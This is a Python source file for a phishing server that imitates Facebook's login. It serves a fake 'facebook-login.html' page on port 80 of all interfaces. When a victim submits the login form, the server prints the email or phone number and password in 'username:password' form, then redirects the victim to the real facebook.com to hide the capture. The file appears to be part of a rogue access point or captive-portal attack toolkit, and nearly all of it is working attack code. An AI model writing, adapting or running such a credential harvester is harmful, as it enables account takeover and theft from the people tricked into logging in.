import threading
from functools import cached_property
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from http.cookies import SimpleCookie
from urllib.parse import parse_qsl, urlparse, parse_qs

import json
import httplib2

from utils import thread_with_trace
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


class WebRequestHandler(BaseHTTPRequestHandler):
    @cached_property
    def url(self):
        return urlparse(self.path)

    @cached_property
    def query_data(self):
        return dict(parse_qsl(self.url.query))

    @cached_property
    def post_data(self):
        content_length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(content_length)

    @cached_property
    def form_data(self):
        return dict(parse_qsl(self.post_data.decode("utf-8")))

    @cached_property
    def cookies(self):
        return SimpleCookie(self.headers.get("Cookie"))

    def do_GET(self):
        if self.path == '/':
            self.path = '/facebook-login.html'
        elif self.path == '/test':
            self.path = '/test.html'
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')

        try:
            file_to_open = open('assets/web_server_files/' + self.path[1:], encoding="utf-8").read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes(file_to_open, 'utf-8'))
        except Exception as e:
            print(e)
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')

    def do_POST(self):
        if self.path != "/login" and self.path != "/login/":
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Not Found')
            return

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        form_data = parse_qs(post_data.decode('utf-8'))

        username_or_phone_number = str(form_data["email"][0])
        password = str(form_data["pass"][0])
        print(username_or_phone_number + ":" + password)
        self.send_response(302)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()
        print("[+] Redirected to facebook")

    def get_response(self):
        return json.dump(
            {
                "path": self.url.path,
                "query_data": self.query_data,
                "post_data": self.post_data.decode("utf-8"),
                "form_data": self.form_data,
                "cookies": {
                    name: cookie.value
                    for name, cookie in self.cookies.items()
                }
            }
        )

    def  do_QUIT(self):
        self.send_response(200)
        self.end_headers()
        self.server.stop = True


class StoppableHttpServer (HTTPServer):
    def serve_forever (self):
        self.stop = False
        while not self.stop:
            self.handle_request()

def http_server_start(printing_queue, verbosity, cancel_token):
    printing_queue.put(f"\n{GREEN}[+] HTTP server started{RESET}")
    server_instance = StoppableHttpServer(('0.0.0.0', 80), WebRequestHandler)
    server_instance.serve_forever()


def stop_server(printing_queue):
    conn = httplib2.HTTPConnectionWithTimeout("127.0.0.1:80")
    conn.request("QUIT", "/")
    conn.getresponse()
    printing_queue.put(f"{GREEN}[+] HTTP server stopped{RESET}")


def start_http_server_thread(interface, printing_queue, verbosity):
    cancel_token = threading.Event()
    http_server_thread = thread_with_trace(target=http_server_start, args=(printing_queue, verbosity, cancel_token))
    http_server_thread.start()
    return cancel_token

